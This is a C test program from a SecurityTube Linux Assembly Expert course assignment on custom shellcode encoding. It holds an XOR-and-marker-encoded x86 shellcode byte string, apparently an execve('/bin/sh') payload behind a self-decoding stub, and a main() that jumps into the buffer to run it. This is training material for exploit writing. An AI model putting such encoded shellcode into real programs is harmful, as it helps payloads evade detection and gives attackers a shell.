#include<stdio.h>
#include<string.h>
//Author: Aaron Weathersby
//SLAE #1488
//Handle: t0b0x0r
//github:https://github.com/t0b0rX0r/slae/upload/master/assignment4
//;Assignment #4- Custom Encoding Scheme
//created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert

unsigned char code[] = \

"\xeb\x44\x5e\x31\xff\x31\xc0\xb0\x01\x31\xdb\x31\xd2\x31\xdb\x8a\x1c\x06\x8a\x54\x06\xff\x80\xf2\x05\x88\x54\x06\xff\x83\xf8\x32\x7d\x06\x47\x83\xc0\x02\xeb\xe3\x8d\x7e\x01\x31\xdb\x31\xc0\xb0\x01\x8a\x1c\x06\x31\xd2\x80\xf3\x90\x75\x10\x8a\x5c\x06\x01\x88\x1f\x47\x04\x02\xeb\xeb\xe8\xb7\xff\xff\xff\x34\x90\xc5\x90\x55\x90\x6d\x90\x2a\x90\x2a\x90\x76\x90\x6d\x90\x6d\x90\x2a\x90\x67\x90\x6c\x90\x6b\x90\x8c\x90\xe6\x90\x55\x90\x8c\x90\xe7\x90\x56\x90\x8c\x90\xe4\x90\xb5\x90\x0e\x90\xc8\x90\x85\x90";


main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
